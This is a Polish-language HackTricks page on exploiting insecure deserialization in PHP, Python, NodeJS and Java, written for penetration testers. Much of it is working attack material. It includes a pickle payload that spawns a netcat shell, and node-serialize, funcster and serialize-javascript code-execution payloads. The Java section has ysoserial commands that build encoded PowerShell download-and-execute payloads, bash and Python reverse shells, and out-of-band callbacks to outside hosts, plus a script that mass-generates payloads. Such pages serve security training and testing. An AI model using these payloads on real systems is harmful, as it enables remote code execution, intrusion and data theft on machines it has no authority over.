# Deserializacja

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>


## Podstawowe informacje

**Serializacja** jest rozumiana jako metoda konwertowania obiektu na format, kt贸ry mo偶na zachowa, z zamiarem przechowywania obiektu lub przesyania go w ramach procesu komunikacji. Ta technika jest czsto stosowana, aby zapewni, 偶e obiekt mo偶e zosta odtworzony w p贸藕niejszym czasie, zachowujc jego struktur i stan.

**Deserializacja**, z kolei, jest procesem przeciwdziaajcym serializacji. Polega na pobieraniu danych, kt贸re zostay sformatowane w okrelonym formacie i odtwarzaniu ich w postaci obiektu.

Deserializacja mo偶e by niebezpieczna, poniewa偶 potencjalnie **umo偶liwia atakujcym manipulowanie danymi zserializowanymi w celu wykonania szkodliwego kodu** lub wywoania nieoczekiwanego zachowania w aplikacji podczas procesu odtwarzania obiektu.


## PHP

W PHP, podczas proces贸w serializacji i deserializacji wykorzystuje si specjalne metody magiczne:

* `__sleep`: Wywoywana podczas serializacji obiektu. Ta metoda powinna zwraca tablic nazw wszystkich waciwoci obiektu, kt贸re powinny by zserializowane. Jest ona czsto u偶ywana do zatwierdzania oczekujcych danych lub wykonywania podobnych zada porzdkowych.
* `__wakeup`: Wywoywana podczas deserializacji obiektu. Su偶y do ponownego nawizania pocze z baz danych, kt贸re mogy zosta utracone podczas serializacji, oraz do wykonywania innych zada inicjalizacyjnych.
* `__unserialize`: Ta metoda jest wywoywana zamiast `__wakeup` (jeli istnieje) podczas deserializacji obiektu. Daje ona wiksz kontrol nad procesem deserializacji w por贸wnaniu do `__wakeup`.
* `__destruct`: Ta metoda jest wywoywana, gdy obiekt ma zosta zniszczony lub gdy skrypt si koczy. Zazwyczaj jest ona u偶ywana do zada porzdkowych, takich jak zamykanie uchwyt贸w plik贸w lub pocze z baz danych.
* `__toString`: Ta metoda pozwala traktowa obiekt jako cig znak贸w. Mo偶e by u偶ywana do odczytu pliku lub innych zada opartych na wywoaniach funkcji wewntrz niej, efektywnie dostarczajc tekstow reprezentacj obiektu.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Jeli spojrzysz na wyniki, zobaczysz, 偶e funkcje **`__wakeup`** i **`__destruct`** s wywoywane podczas deserializacji obiektu. Zauwa偶, 偶e w wielu samouczkach znajdziesz informacj, 偶e funkcja **`__toString`** jest wywoywana podczas pr贸by wydrukowania pewnego atrybutu, ale wyglda na to, 偶e to ju偶 **nie ma miejsca**.

{% hint style="warning" %}
Metoda **`__unserialize(array $data)`** jest wywoywana **zamiast `__wakeup()`**, jeli jest zaimplementowana w klasie. Pozwala na odszeregowanie obiektu, dostarczajc dane seryjne jako tablic. Mo偶esz u偶y tej metody do odszeregowania waciwoci i wykonania wszelkich niezbdnych czynnoci podczas deserializacji.
```php
class MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

Mo偶esz przeczyta wyjaniony **przykad PHP tutaj**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), tutaj [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) lub tutaj [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

Mo偶esz wykorzysta funkcjonalno automatycznego adowania klas PHP do adowania dowolnych plik贸w PHP i wicej:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### Serializowanie wartoci referencyjnych

Jeli z jakiego powodu chcesz zserializowa warto jako **referencj do innej zserializowanej wartoci**, mo偶esz:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (ysoserial dla PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) mo偶e pom贸c w generowaniu payload贸w do wykorzystania deserializacji w PHP.\
Nale偶y zauwa偶y, 偶e w wielu przypadkach **nie bdzie mo偶liwe znalezienie sposobu na wykorzystanie deserializacji w kodzie 藕r贸dowym** aplikacji, ale mo偶na **wykorzysta kod zewntrznych rozszerze PHP**.\
Jeli to mo偶liwe, sprawd藕 `phpinfo()` na serwerze i **poszukaj w internecie** (nawet w **gad偶etach** z **PHPGGC**) mo偶liwych gad偶et贸w, kt贸re mo偶na wykorzysta.

### Deserializacja metadanych phar://

Jeli znalaze LFI, kt贸ry tylko czyta plik, ale nie wykonuje w nim kodu PHP, na przykad za pomoc funkcji takich jak _**file\_get\_contents(), fopen(), file() lub file\_exists(), md5\_file(), filemtime() lub filesize()**_**.** Mo偶esz spr贸bowa wykorzysta **deserializacj**, kt贸ra wystpuje podczas **odczytu** pliku za pomoc protokou **phar**.\
Aby uzyska wicej informacji, przeczytaj nastpujcy post:

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

Gdy obiekt zostanie odtworzony, zostanie wykonana funkcja _\_\_reduce\_\__.\
Podczas eksploatacji serwer mo偶e zwr贸ci bd.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Aby uzyska wicej informacji na temat ucieczki z wizie **pickle**, sprawd藕:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

Na nastpnej stronie przedstawiona jest technika **wykorzystania niebezpiecznej deserializacji w bibliotekach pythona obsugujcych yamle** i koczy si narzdziem, kt贸re mo偶na u偶y do generowania adunk贸w deserializacji RCE dla **Pickle, PyYAML, jsonpickle i ruamel.yaml**:

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### Zanieczyszczenie klasy (Python Prototype Pollution)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### Magiczne funkcje JS

JS **nie posiada "magicznych" funkcji** takich jak PHP lub Python, kt贸re s wykonywane tylko w celu utworzenia obiektu. Ale ma kilka **funkcji**, kt贸re s **czsto u偶ywane nawet bez bezporedniego ich wywoywania**, takich jak **`toString`**, **`valueOf`**, **`toJSON`**.\
Jeli wykorzystasz deserializacj, mo偶esz **zagra偶a tym funkcjom, aby wykona inny kod** (potencjalnie wykorzystujc zanieczyszczenie prototyp贸w), co pozwoli Ci wykonywa dowolny kod podczas ich wywoywania.

Innym **"magicznym" sposobem na wywoanie funkcji** bez bezporedniego jej wywoywania jest **zagra偶enie obiektowi zwracanemu przez funkcj asynchroniczn** (promise). Poniewa偶, jeli **przeksztacisz** ten **obiekt zwracany** w inny **promise** o **waciwoci** o nazwie **"then" o typie funkcji**, zostanie on **wykonany** tylko dlatego, 偶e jest zwracany przez inny promise. _Kliknij_ [_**ten link**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _aby uzyska wicej informacji._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### Zanieczyszczenie `__proto__` i `prototype`

Jeli chcesz dowiedzie si wicej o tej technice, **zapoznaj si z poni偶szym samouczkiem**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Ta biblioteka umo偶liwia serializacj funkcji. Przykad:
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
Obiekt **zserializowany** bdzie wyglda jak:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
W przykadzie wida, 偶e gdy funkcja jest serializowana, do obiektu serializowanego dodawana jest flaga `_$$ND_FUNC$$_`.

W pliku `node-serialize/lib/serialize.js` mo偶na znale藕 t sam flag i spos贸b, w jaki jest ona u偶ywana w kodzie.

![](<../../.gitbook/assets/image (297).png>)

![](<../../.gitbook/assets/image (298).png>)

Jak wida w ostatnim fragmencie kodu, **jeli flaga zostanie znaleziona**, u偶ywane jest `eval` do deserializacji funkcji, wic w zasadzie **wejcie u偶ytkownika jest u偶ywane wewntrz funkcji `eval`**.

Jednak偶e, **tylko serializacja** funkcji **nie spowoduje jej wykonania**, poniewa偶 konieczne jest, aby jaki fragment kodu **wywoywa `y.rce`** w naszym przykadzie, co jest mao **prawdopodobne**.\
W ka偶dym razie, mo偶na po prostu **zmodyfikowa serializowany obiekt**, **dodajc nawiasy** w celu automatycznego wykonania zdeserializowanej funkcji, gdy obiekt zostanie zdeserializowany.\
W nastpnym fragmencie kodu **zauwa偶 ostatni nawias** i spos贸b, w jaki funkcja `unserialize` automatycznie wykonuje kod:
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
Jak wczeniej wspomniano, ta biblioteka pobierze kod po `_$$ND_FUNC$$_` i **wykona go** za pomoc `eval`. Aby **automatycznie wykona kod**, mo偶na **usun cz tworzenia funkcji** oraz ostatnie nawiasy i **wykona jednolinijkowy kod JS**, jak w poni偶szym przykadzie:
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
Mo偶esz [**znale藕 tutaj**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **dodatkowe informacje** na temat sposobu wykorzystania tej podatnoci.

### [funcster](https://www.npmjs.com/package/funcster)

Warto zauwa偶y, 偶e **funcster** nie ma dostpu do **standardowych wbudowanych obiekt贸w**; wypadaj one poza zakresem dostpnym. To ograniczenie uniemo偶liwia wykonanie kodu, kt贸ry pr贸buje wywoa metody na wbudowanych obiektach, co prowadzi do wystpienia wyjtk贸w, takich jak `"ReferenceError: console is not defined"`, gdy u偶ywane s polecenia takie jak `console.log()` lub `require(something)`.

Mimo tego ograniczenia, przywr贸cenie penego dostpu do globalnego kontekstu, wcznie ze wszystkimi standardowymi wbudowanymi obiektami, jest mo偶liwe dziki okrelonemu podejciu. Wykorzystujc bezporednio globalny kontekst, mo偶na omin to ograniczenie. Na przykad, dostp mo偶na przywr贸ci za pomoc poni偶szego fragmentu kodu:
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**Aby uzyska wicej informacji, przeczytaj ten 藕r贸do**.

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

Pakiet **serialize-javascript** jest przeznaczony wycznie do cel贸w serializacji i nie posiada wbudowanych funkcji deserializacji. U偶ytkownicy s odpowiedzialni za implementacj wasnej metody deserializacji. Oficjalny przykad deserializacji zaleca bezporednie u偶ycie `eval`:
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
Jeli ta funkcja jest u偶ywana do deserializacji obiekt贸w, mo偶na j **atwo wykorzysta**:
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**Aby uzyska wicej informacji, przeczytaj ten 藕r贸do**.

### Biblioteka Cryo

Na nastpnych stronach znajdziesz informacje na temat tego, jak wykorzysta t bibliotek do wykonania dowolnych polece:

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

W Javie **wywoywane s zwroty deserializacji podczas procesu deserializacji**. Ten proces mo偶na wykorzysta, tworzc zoliwe dane, kt贸re wywouj te zwroty, co prowadzi do potencjalnego wykonania szkodliwych dziaa.

### Odciski palc贸w

#### White Box

Aby zidentyfikowa potencjalne podatnoci na serializacj w kodzie, wyszukaj:

* Klasy implementujce interfejs `Serializable`.
* U偶ycie funkcji `java.io.ObjectInputStream`, `readObject`, `readUnshare`.

Zwr贸 szczeg贸ln uwag na:

* `XMLDecoder` u偶ywany z parametrami zdefiniowanymi przez zewntrznych u偶ytkownik贸w.
* Metoda `fromXML` w `XStream`, zwaszcza jeli wersja XStream jest mniejsza lub r贸wna 1.46, poniewa偶 jest podatna na problemy z serializacj.
* `ObjectInputStream` w poczeniu z metod `readObject`.
* Implementacja metod takich jak `readObject`, `readObjectNodData`, `readResolve` lub `readExternal`.
* `ObjectInputStream.readUnshared`.
* Og贸lne u偶ycie `Serializable`.

#### Black Box

Podczas test贸w black box, poszukaj konkretnych **sygnatur lub "Magicznych bajt贸w"**, kt贸re wskazuj na obiekty serializowane w Javie (pochodzce z `ObjectInputStream`):

* Wzorzec szesnastkowy: `AC ED 00 05`.
* Wzorzec Base64: `rO0`.
* Nag贸wki odpowiedzi HTTP z ustawionym `Content-type` na `application/x-java-serialized-object`.
* Wzorzec szesnastkowy wskazujcy na wczeniejsz kompresj: `1F 8B 08 00`.
* Wzorzec Base64 wskazujcy na wczeniejsz kompresj: `H4sIA`.
* Pliki internetowe z rozszerzeniem `.faces` i parametrem `faces.ViewState`. Odkrycie tych wzorc贸w w aplikacji internetowej powinno skoni do dokadnego zbadania, jak opisano w [pocie dotyczcym deserializacji Java JSF ViewState](java-jsf-viewstate-.faces-deserialization.md).
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### Sprawd藕, czy jest podatny

Jeli chcesz dowiedzie si, jak dziaa atak deserializacji w Javie, powiniene zapozna si z [**Podstawow deserializacj w Javie**](basic-java-deserialization-objectinputstream-readobject.md), [**Deserializacj DNS w Javie**](java-dns-deserialization-and-gadgetprobe.md) i [**Payloadem CommonsCollection1**](java-transformers-to-rutime-exec-payload.md).

#### Test biaej skrzynki

Mo偶esz sprawdzi, czy zainstalowana jest jaka aplikacja znanymi podatnociami.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
Mo偶esz spr贸bowa **sprawdzi wszystkie biblioteki**, kt贸re s znane z podatnoci i dla kt贸rych [**Ysoserial**](https://github.com/frohoff/ysoserial) mo偶e dostarczy exploit. Mo偶esz r贸wnie偶 sprawdzi biblioteki wskazane na [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
Mo偶esz r贸wnie偶 u偶y narzdzia [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector), aby wyszuka mo偶liwe acuchy gad偶et贸w, kt贸re mog by wykorzystane.\
Podczas uruchamiania **gadgetinspector** (po jego zbudowaniu) nie przejmuj si iloci ostrze偶e/bd贸w, przez kt贸re przechodzi, i pozw贸l mu zakoczy. Wszystkie znalezione informacje zostan zapisane w pliku _gadgetinspector/gadget-results/gadget-chains-rok-miesic-dzie-godzina-minuta.txt_. Nale偶y jednak zauwa偶y, 偶e **gadgetinspector nie tworzy exploitu i mo偶e wskazywa faszywe pozytywy**.

#### Test Black Box

Za pomoc rozszerzenia Burp [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) mo偶na zidentyfikowa, **kt贸re biblioteki s dostpne** (a nawet ich wersje). Dziki tym informacjom atwiej bdzie **wybra payload**, kt贸ry wykorzysta podatno.\
[**Przeczytaj wicej na temat GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe skupia si na deserializacji **`ObjectInputStream`**.

Za pomoc rozszerzenia Burp [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) mo偶na **zidentyfikowa podatne biblioteki**, kt贸re mo偶na wykorzysta za pomoc ysoserial i **wykorzysta** je.\
[**Przeczytaj wicej na temat Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner skupia si na deserializacji **`ObjectInputStream`**.

Mo偶esz r贸wnie偶 u偶y narzdzia [**Freddy**](https://github.com/nccgroup/freddy), aby wykry podatnoci zwizane z deserializacj w **Burp**. Ten plugin wykryje podatnoci zwizane nie tylko z deserializacj **`ObjectInputStream`**, ale tak偶e z bibliotekami deserializacji **Json** i **Yml**. W trybie aktywnym spr贸buje je potwierdzi, u偶ywajc op贸藕nie lub payload贸w DNS.\
[**Wicej informacji na temat Freddy znajdziesz tutaj.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

#### Test serializacji

Nie chodzi tylko o sprawdzenie, czy serwer u偶ywa jakiejkolwiek podatnej biblioteki. Czasami mo偶esz mie mo偶liwo **zmiany danych wewntrz obiektu zserializowanego i obejcia niekt贸rych kontroli** (mo偶e to da ci uprawnienia administratora w aplikacji internetowej).\
Jeli znajdziesz obiekt zserializowany w jzyku Java, kt贸ry jest wysyany do aplikacji internetowej, mo偶esz u偶y narzdzia [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper), aby wydrukowa w bardziej czytelnej formie obiekt zserializowany, kt贸ry jest wysyany. Znajc dane, kt贸re wysyasz, atwiej bdzie je zmodyfikowa i obej niekt贸re kontrole.

### **Exploit**

#### **ysoserial**

G贸wnym narzdziem do wykorzystywania deserializacji w jzyku Java jest [**ysoserial**](https://github.com/frohoff/ysoserial) ([**pobierz tutaj**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). Mo偶esz r贸wnie偶 rozwa偶y u偶ycie [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified), co pozwoli ci u偶ywa bardziej skomplikowanych polece (np. z u偶yciem potok贸w).\
Nale偶y zauwa偶y, 偶e to narzdzie jest **skoncentrowane** na wykorzystywaniu **`ObjectInputStream`**.\
Zalecam **rozpoczcie od payloadu "URLDNS"** przed payloadem RCE, aby sprawdzi, czy wstrzyknicie jest mo偶liwe. Nale偶y jednak zauwa偶y, 偶e payload "URLDNS" mo偶e nie dziaa, ale inny payload RCE mo偶e dziaa.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
Podczas tworzenia payloadu dla **java.lang.Runtime.exec()** nie mo偶na u偶ywa znak贸w specjalnych, takich jak ">" lub "|" do przekierowania wyniku wykonania, "$()" do wykonania polece, ani nawet **przekazywa argument贸w** do polecenia oddzielonych **spacjami** (mo偶na u偶y `echo -n "hello world"`, ale nie mo偶na u偶y `python2 -c 'print "Hello world"'`). Aby poprawnie zakodowa payload, mo偶na [u偶y tej strony internetowej](http://www.jackson-t.ca/runtime-exec-payloads.html).

Mo偶esz swobodnie u偶y nastpujcego skryptu do utworzenia **wszystkich mo偶liwych payload贸w do wykonania kodu** dla system贸w Windows i Linux, a nastpnie przetestowa je na podatnej stronie internetowej:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

Mo偶esz **u偶y** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **razem z ysoserial, aby tworzy wicej exploit贸w**. Wicej informacji na temat tego narzdzia znajdziesz w **slajdach prezentacji**, w kt贸rej narzdzie zostao przedstawione: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[**marshalsec**](https://github.com/mbechler/marshalsec) mo偶na u偶y do generowania payload贸w w celu wykorzystania r贸偶nych bibliotek serializacji **Json** i **Yml** w jzyku Java.\
Aby skompilowa projekt, musiaem **doda** te **zale偶noci** do `pom.xml`:
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Zainstaluj Maven** i **skompiluj** projekt:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

Dowiedz si wicej o tej bibliotece JSON dla Javy: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Laboratoria

* Jeli chcesz przetestowa niekt贸re adunki ysoserial, mo偶esz **uruchomi t aplikacj internetow**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
